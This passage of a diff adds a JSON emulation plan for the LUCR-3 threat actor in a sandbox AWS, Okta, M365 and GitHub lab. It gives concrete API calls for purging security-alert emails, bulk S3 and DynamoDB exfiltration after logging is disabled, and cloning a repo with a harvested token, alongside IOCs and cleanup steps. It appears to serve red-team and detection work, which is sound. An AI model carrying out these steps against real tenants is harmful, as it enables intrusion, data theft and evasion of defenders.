+        "api_calls": [
+          {
+            "service": "ssm",
+            "method": "start_session",
+            "args": {
+              "Target": "${lucr3-ec2-target-instance-id}",
+              "DocumentName": "AWS-StartSSHSession",
+              "Parameters": {
+                "portNumber": [
+                  "22"
+                ]
+              }
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": [
+        "SSM Session Manager event logs",
+        "VPC Flow Logs",
+        "EC2 OS auth logs"
+      ],
+      "cleanup_actions": [
+        "SSM session terminates on disconnect \u2014 no cleanup required; EC2 instance terminated separately in cleanup_manifest"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          60,
+          300
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "SSM StartSession from attacker IAM user (non-standard principal)",
+        "VPC Flow Logs: unexpected inter-instance connection",
+        "EC2 OS: new interactive session from SSM agent"
+      ]
+    },
+    {
+      "step": 19,
+      "phase": 9,
+      "technique_id": "T1072",
+      "technique_name": "Software Deployment Tools",
+      "tactic": "Lateral Movement",
+      "execution_context": "lateral_movement",
+      "target_resource": "lucr3-ec2-target",
+      "description": "DOCUMENTED ONLY \u2014 NOT IMPLEMENTED IN ATTACK SCRIPT. Real LUCR-3 leverages SCCM/Intune to push payloads to domain-joined endpoints after gaining privileged AD access via federated identity. The sandbox has no domain controller or domain-joined endpoints, so this technique cannot be safely emulated. Broader host access is approximated by the SSM session in Step 18.",
+      "implementation": {
+        "method": "Documented only \u2014 no code in attack.py. SCCM query enumeration requires domain-joined lab endpoint.",
+        "credential_source": "phase3_okta_session",
+        "details": {
+          "cannot_emulate_reason": "SCCM lateral movement requires domain-joined endpoints and may disrupt production per operational_notes.cannot_safely_emulate"
+        }
+      },
+      "expected_audit_events": [],
+      "audit_visible": false,
+      "detection_sources": [
+        "SCCM audit log \u2014 out of scope for this sandbox"
+      ],
+      "cleanup_actions": [
+        "No resources created \u2014 no cleanup required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          3600,
+          86400
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "None in lab emulation"
+      ]
+    },
+    {
+      "step": 20,
+      "phase": 9,
+      "technique_id": "T1070.008",
+      "technique_name": "Indicator Removal: Clear Mailbox Data",
+      "tactic": "Defense Evasion",
+      "execution_context": "saas_attack",
+      "target_resource": "lucr3-m365-sharepoint-site",
+      "description": "Using the Microsoft Graph token from Step 6, delete security alert and phishing notification emails from the victim M365 mailbox to reduce forensic artifacts. LUCR-3 clears mailboxes post-exfiltration to suppress victim awareness and IR triggers.",
+      "implementation": {
+        "method": "Microsoft Graph API DELETE calls using the Graph access_token obtained in Step 6",
+        "credential_source": "phase3_okta_session",
+        "details": {
+          "step1": "GET https://graph.microsoft.com/v1.0/me/messages?$filter=subject eq 'Security Alert' \u2014 find security notification emails",
+          "step2": "POST https://graph.microsoft.com/v1.0/me/messages/{id}/move with {destinationId: 'deleteditems'} \u2014 soft delete to Deleted Items",
+          "step3": "DELETE https://graph.microsoft.com/v1.0/me/mailFolders/deleteditems/messages/{id} \u2014 hard delete to purge from recoverable items"
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "HardDelete",
+          "eventSource": "M365 Audit Log"
+        },
+        {
+          "eventName": "SoftDelete",
+          "eventSource": "M365 Audit Log"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "M365 Unified Audit Log",
+        "Microsoft Defender for Cloud Apps",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Deleted emails are synthetic \u2014 no restoration required"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          30,
+          120
+        ]
+      },
+      "risk_level": "low",
+      "iocs_generated": [
+        "M365 Audit Log: HardDelete of security alert emails from federated principal",
+        "Microsoft Defender MCAS: mailbox tampering alert",
+        "Bulk email deletion from anomalous IP"
+      ]
+    },
+    {
+      "step": 21,
+      "phase": 10,
+      "technique_id": "T1530",
+      "technique_name": "Data from Cloud Storage",
+      "tactic": "Collection",
+      "execution_context": "api_attack",
+      "target_resource": "lucr3-s3-corporate-data",
+      "description": "Exfiltrate objects from lucr3-s3-corporate-data, lucr3-s3-engineering-artifacts, and lucr3-bait-terraform-state using the attacker IAM key. Also scan lucr3-dynamodb-customer-records for PII. Equivalent to LUCR-3's observed S3 Browser 10.9.9 and CloudShell usage for bulk data theft. CloudTrail is stopped at this point.",
+      "implementation": {
+        "method": "boto3 S3 get_object and DynamoDB scan using phase8_attacker_iam_key",
+        "credential_source": "phase8_attacker_iam_key",
+        "api_calls": [
+          {
+            "service": "s3",
+            "method": "list_objects_v2",
+            "args": {
+              "Bucket": "lucr3-s3-corporate-data"
+            }
+          },
+          {
+            "service": "s3",
+            "method": "get_object",
+            "args": {
+              "Bucket": "lucr3-s3-corporate-data",
+              "Key": "sensitive-data.txt"
+            }
+          },
+          {
+            "service": "s3",
+            "method": "list_objects_v2",
+            "args": {
+              "Bucket": "lucr3-s3-engineering-artifacts"
+            }
+          },
+          {
+            "service": "s3",
+            "method": "get_object",
+            "args": {
+              "Bucket": "lucr3-s3-engineering-artifacts",
+              "Key": "terraform.tfstate"
+            }
+          },
+          {
+            "service": "dynamodb",
+            "method": "scan",
+            "args": {
+              "TableName": "lucr3-dynamodb-customer-records",
+              "Limit": 100
+            }
+          }
+        ]
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "GetObject",
+          "eventSource": "s3.amazonaws.com"
+        },
+        {
+          "eventName": "ListObjects",
+          "eventSource": "s3.amazonaws.com"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "S3 server access logs (independent of CloudTrail)",
+        "GuardDuty (disabled at this point)",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Read-only \u2014 exfiltrated copies deleted from emulation host after exercise"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          60,
+          300
+        ]
+      },
+      "risk_level": "high",
+      "iocs_generated": [
+        "S3 server access log: bulk GetObject from attacker IAM key",
+        "lucr3-bait-terraform-state access triggers canary alert independent of CloudTrail",
+        "DynamoDB Scan on customer records table",
+        "GuardDuty: Exfiltration:S3/MaliciousIPCaller \u2014 suppressed (detector disabled)"
+      ]
+    },
+    {
+      "step": 22,
+      "phase": 10,
+      "technique_id": "T1213.003",
+      "technique_name": "Data from Information Repositories: Code Repositories",
+      "tactic": "Collection",
+      "execution_context": "saas_attack",
+      "target_resource": "lucr3-github-target-repo",
+      "description": "Clone lucr3-github-target-repo using the GitHub PAT from SecretsManager. LUCR-3 exfiltrates source code repositories to extract embedded secrets, proprietary IP, and deployment configuration. If the bait PAT is revoked, attempt clone fails with 401 and is documented as expected outcome.",
+      "implementation": {
+        "method": "GitHub API calls and subprocess git clone using phase9_scraped_github_pat",
+        "credential_source": "phase9_scraped_github_pat",
+        "details": {
+          "step1": "GET https://api.github.com/repos/{GITHUB_OWNER}/lucr3-github-target-repo \u2014 verify access",
+          "step2": "GET https://api.github.com/repos/{GITHUB_OWNER}/lucr3-github-target-repo/contents \u2014 enumerate top-level files",
+          "step3": "subprocess.run(['git', 'clone', 'https://{pat}@github.com/{GITHUB_OWNER}/lucr3-github-target-repo', '/tmp/lucr3-repo']) \u2014 full clone",
+          "note": "401 on revoked bait token is expected and documented. Attempt still generates GitHub Audit Log event."
+        }
+      },
+      "expected_audit_events": [
+        {
+          "eventName": "git.clone",
+          "eventSource": "GitHub Audit Log"
+        },
+        {
+          "eventName": "repository.download",
+          "eventSource": "GitHub Audit Log"
+        }
+      ],
+      "audit_visible": true,
+      "detection_sources": [
+        "GitHub Audit Log",
+        "GitHub Advanced Security",
+        "SIEM"
+      ],
+      "cleanup_actions": [
+        "Cloned repo at /tmp/lucr3-repo deleted from emulation host post-exercise"
+      ],
+      "operational_tempo": {
+        "delay_after_seconds": [
+          60,
+          300
+        ]
+      },
+      "risk_level": "medium",
+      "iocs_generated": [
+        "GitHub: repository clone attempt from anomalous IP",
+        "GitHub Advanced Security: secret scanning triggered on clone",
+        "git.clone event outside normal CI/CD pipeline"
+      ]
+    }
+  ],
+  "credential_chain": [
+    {
+      "id": "phase1_okta_creds",
+      "phase": 1,
+      "source": "Pre-seeded Okta test credentials (OKTA_VICTIM_USERNAME + OKTA_VICTIM_PASSWORD) simulating deepweb marketplace purchase or smishing harvest",
+      "technique": "T1078.004",
+      "type": "idp_username_password",
+      "session_name": "okta_victim_credentials",
+      "used_in_phases": [
+        1
+      ],
+      "expiration": "static until rotated"
+    },
+    {
+      "id": "phase3_okta_session",
+      "phase": 2,
+      "source": "Okta sessionToken returned by /api/v1/authn after MFA challenge approval in Step 2, made persistent by attacker device enrollment in Step 4 (T1098.005)",
+      "technique": "T1098.005",
+      "type": "okta_session_token",
+      "session_name": "okta_session_cookie",
+      "used_in_phases": [
+        2,
+        3,
+        4,
+        9
+      ],
+      "expiration": "8 hours (Okta default session lifetime); persistent re-auth via enrolled TOTP device"
+    },
+    {
+      "id": "phase3_aws_saml_session",
+      "phase": 3,
+      "source": "AWS STS temporary credentials from sts:AssumeRoleWithSAML using Okta SAML assertion for lucr3-privileged-federated-role (Step 5)",
+      "technique": "T1078.004",
+      "type": "sts_session",
+      "session_name": "aws_saml_session",
+      "used_in_phases": [
+        3,
+        5,
+        6
+      ],
+      "expiration": "1 hour (STS AssumeRoleWithSAML default MaxSessionDuration)"
+    },
+    {
+      "id": "phase8_attacker_iam_key",
+      "phase": 6,
+      "source": "AWS long-lived access key created by iam:CreateAccessKey on lucr3-attacker-iam-user in Step 12 (T1098.001)",
+      "technique": "T1098.001",
+      "type": "aws_long_lived_access_key",
+      "session_name": "attacker_iam_session",
+      "used_in_phases": [
+        7,
+        8,
+        9,
+        10
+      ],
+      "expiration": "non-expiring until explicitly rotated or deleted"
+    },
+    {
+      "id": "phase9_scraped_github_pat",
+      "phase": 7,
+      "source": "GitHub PAT retrieved from lucr3-bait-github-pat-secret via secretsmanager:GetSecretValue in Step 13 (T1555.006). Token is a canary \u2014 revoked but triggers detection on use.",
+      "technique": "T1555.006",
+      "type": "github_personal_access_token",
+      "session_name": "github_pat",
+      "used_in_phases": [
+        8,
+        10
+      ],
+      "expiration": "revoked (bait token); long-lived if real"
+    }
+  ],
+  "script_manifest": {
+    "attack_script": "attack.py",
+    "description": "Single unified attack script managing credential chain across 10 phases and 22 steps. Phases 1-4 use requests/okta-sdk for Okta IDP flows; Phase 3 bridge uses boto3 sts.assume_role_with_saml(); Phases 5-10 use boto3 for AWS API and requests/msal for Microsoft Graph and GitHub API. T1111 (Step 3) and T1072 (Step 19) are documented-only stubs that log intent but execute no network calls.",
+    "entry_point": "main(target_info)",
+    "phases": [
+      {
+        "phase": 1,
+        "name": "Initial IDP Compromise",
+        "techniques": [
+          "T1078.004",
+          "T1621",
+          "T1111"
+        ],
+        "context": "idp_attack"
+      },
+      {
+        "phase": 2,
+        "name": "IDP Persistence via Device Registration",
+        "techniques": [
+          "T1098.005"
+        ],
+        "context": "idp_attack"
+      },
+      {
+        "phase": 3,
+        "name": "Cloud Pivot via SAML Federation",
+        "techniques": [
+          "T1078.004"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 4,
+        "name": "SaaS Collection via Federated M365",
+        "techniques": [
+          "T1213.002"
+        ],
+        "context": "saas_attack"
+      },
+      {
+        "phase": 5,
+        "name": "AWS Discovery",
+        "techniques": [
+          "T1580",
+          "T1619",
+          "T1082"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 6,
+        "name": "AWS Backdoor and Persistence",
+        "techniques": [
+          "T1136.003",
+          "T1098",
+          "T1098.001"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 7,
+        "name": "Credential Harvest and Compute Staging",
+        "techniques": [
+          "T1555.006",
+          "T1578.002"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 8,
+        "name": "Defense Evasion",
+        "techniques": [
+          "T1550.001",
+          "T1562.001",
+          "T1562.008"
+        ],
+        "context": "api_attack"
+      },
+      {
+        "phase": 9,
+        "name": "Lateral Movement and Artifact Removal",
+        "techniques": [
+          "T1021.004",
+          "T1072",
+          "T1070.008"
+        ],
+        "context": "lateral_movement"
+      },
+      {
+        "phase": 10,
+        "name": "Bulk Exfiltration",
+        "techniques": [
+          "T1530",
+          "T1213.003"
+        ],
+        "context": "api_attack"
+      }
+    ]
+  },
+  "cleanup_manifest": {
+    "attack_created_resources": [
+      {
+        "type": "Okta Enrolled Factor",
+        "name": "Attacker TOTP device on lucr3-okta-victim-user",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "IAM User",
+        "name": "lucr3-attacker-iam-user",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "IAM Access Key",
+        "name": "Access key generated for lucr3-attacker-iam-user (T1098.001)",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "IAM User Policy",
+        "name": "AdministratorAccess attached to lucr3-attacker-iam-user",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "IAM Instance Profile",
+        "name": "lucr3-attack-instance-profile",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "EC2 Instance",
+        "name": "lucr3-attack-host (t3.micro in lucr3-subnet-pub)",
+        "cleaned_during_attack": false
+      },
+      {
+        "type": "Local Clone",
+        "name": "/tmp/lucr3-repo on emulation host",
+        "cleaned_during_attack": false
+      }
+    ],
+    "pulumi_managed_resources": "All infrastructure destroyed by pulumi destroy \u2014 lucr3-cloudtrail, lucr3-guardduty-detector, lucr3-s3-corporate-data, lucr3-s3-engineering-artifacts, lucr3-secrets-prod-db, lucr3-secrets-stripe-api, lucr3-dynamodb-customer-records, lucr3-ec2-target, lucr3-vpc, lucr3-okta-victim-user, lucr3-azuread-saml-app, lucr3-aws-saml-idp, lucr3-m365-sharepoint-site, lucr3-github-target-repo, all bait resources",
+    "cleanup_order": [
+      "Re-enable GuardDuty detector: guardduty:UpdateDetector Enable=true",
+      "Re-enable CloudTrail: cloudtrail:StartLogging lucr3-cloudtrail",
+      "Remove attacker TOTP factor from lucr3-okta-victim-user: DELETE /api/v1/users/{userId}/factors/{enrolled_factor_id}",
+      "Delete IAM access key on lucr3-attacker-iam-user: iam:DeleteAccessKey",
+      "Detach AdministratorAccess from lucr3-attacker-iam-user: iam:DetachUserPolicy",
+      "Delete IAM login profile: iam:DeleteLoginProfile lucr3-attacker-iam-user",
+      "Delete IAM user: iam:DeleteUser lucr3-attacker-iam-user",
+      "Terminate EC2 instance: ec2:TerminateInstances lucr3-attack-host",
+      "Delete IAM instance profile: iam:DeleteInstanceProfile lucr3-attack-instance-profile",
+      "Delete local repo clone: rm -rf /tmp/lucr3-repo",
+      "pulumi destroy"
+    ]
+  },
+  "dwell_time_recommendation_seconds": 600,
+  "total_techniques": 21,
+  "total_attack_steps": 22,
+  "mitre_tactics_covered": [
+    "Initial Access",
+    "Credential Access",
+    "Persistence",
+    "Discovery",
+    "Privilege Escalation",
+    "Collection",
+    "Defense Evasion",
+    "Lateral Movement"
+  ]
+}
